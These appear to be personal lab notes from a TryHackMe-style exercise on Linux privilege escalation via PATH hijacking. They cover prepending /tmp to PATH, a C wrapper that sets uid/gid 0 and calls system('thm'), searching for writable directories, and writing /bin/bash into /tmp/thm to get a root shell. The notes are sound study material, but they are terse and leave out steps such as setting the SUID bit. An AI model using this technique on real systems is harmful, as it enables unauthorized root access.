Everything is a file in Linux. So the Linux commands are also files. For example, cat is a binary file that is located in the /usr/bin directory. We can check where the command that we typed is located with which command.

```bash
which cat
```

The PATH variable is an environment variable that specifies the locations where executable commands are located.

![](Pasted%20image%2020250703100255.png)

if we want to add the path so for current user so we can do it.Add only that path where we have permission to write so we use here tmp path.

```bash
export PATH=/tmp:$PATH  #add tmp path along with other path
```

```c
#include <unistd.h>
void main() 
{  
setgid(0);  
setuid(0);  //set permissions to root
system("thm");  //look for exec_command thm 
}  
```

Now first we compile it and then execute on target system

![](Pasted%20image%2020250703101354.png)

```bash
find / -writable 2>/dev/null    #search writable directory

find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u  #more sorted result

# cut -d "/" -f 2,3   keep 2 and 3 dir after /
# grep -v proc | sort -u    remove running proc and show unique
```

![](Pasted%20image%2020250703113628.png)

```bash
ls -ld /home/murdoch    #check dir permission
 [ -w /home/murdoch ] && echo "Writable" || echo "Not writable"   #check writeable or not

echo "/bin/bash" > /tmp/thm   #add shell in thm file
```

![](Pasted%20image%2020250703113649.png)

